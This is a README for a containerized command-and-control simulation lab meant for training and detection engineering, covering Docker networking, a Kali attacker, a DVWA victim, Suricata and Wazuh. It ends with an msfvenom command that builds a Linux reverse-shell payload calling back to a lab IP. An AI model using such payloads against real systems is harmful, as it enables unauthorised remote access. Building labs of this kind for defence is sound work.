## Cyborg C2: A Realistic, Containerized Adversary Simulation Framework   [ In development ]

### 🧠 Concepts
Build a containerized, modular Command & Control (C2) simulation framework that replicates real-world adversary behavior, inspired by tools like Cobalt Strike, Mythic, and Sliver, but built for training, detection engineering, and research, not real attacks.

### 🞋 Goal
A C2 server (attacker-controlled)
One or more victim containers (simulated endpoints)
A Suricata container (monitoring/sniffing traffic)
A Wazuh agent or manager (for SIEM + alerting)

### 🔁 Data Flow Summary:
- Kali VM (in VirtualBox) is the main attacker, issuing commands or payloads.
- The Docker C2 (e.g., Mythic or a custom Flask-based C2) manages communications with deployed payloads.
- Multiple Attack Containers simulate malware stages (e.g., phishing, privilege escalation).
- Defender Containers (IDS, loggers) inspect traffic, generate alerts, and provide telemetry.

### Workflow 
```
┌────────────┐
│  Kali VM   │  ← attacker
└────┬───────┘
     │
     ▼
┌────────────┐
│  C2 Docker │  ← attacker infra (Flask/Mythic listener)
└────┬───────┘
     │
     ▼
┌────────────┐
│ Victim Box │  ← vulnerable machine (e.g., DVWA container)
│ + Suricata │  ← monitors traffic
└────┬───────┘
     │
     ▼
┌────────────┐
│ Wazuh/ELK  │  ← parses + visualizes Suricata logs
└────────────┘

```

### How are IP's are assigned 
```
1. Create the netwrok :
docker network create \
  --subnet=192.168.100.0/24 \
  --gateway=192.168.100.1 \
  cyberlab_net

📌 When you run the contianers attach them like this:
docker run --rm -it \
  --network=cyberlab_net \
  --ip=192.168.100.10 \
  --name=c2_server my-c2-image

2. In Virtual Box Kali VM: Set up host-only adapter in adapter-2
   Go to Kali VM Settings > Network > Adapter 2
          * Enable Host-Only Adapter
          * Assign adapter to vboxnet0 or your custom host-only adapter
          * Inside the Kali-Linux machine:
               sudo ip addr add 192.168.100.50/24 dev eth1
               sudo ip link set dev eth1 up
```
---

## Recommended Docker Images

```
🕵️‍♂️ 1. C2 Server (Command & Control)
          Mythic C2
          Docker image : its-a-feature/mythic
          Notes : Best for full-featured real-world C2
🎯 2. Victim Machine(s):
          👉 You can also make your own Dockerfile with backdoors or open ports
          [Upload in the Github Folder]
🧅 3. Suricata IDS:
📊 4. Wazuh SIEM Stack:
          ✅ Recommended: Use their official docker-compose repo for
                          a full deployment (Wazuh + ELK).
```


payload creation :
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf > shell.elf
 chmod +x shell.elf 

msfconsole 

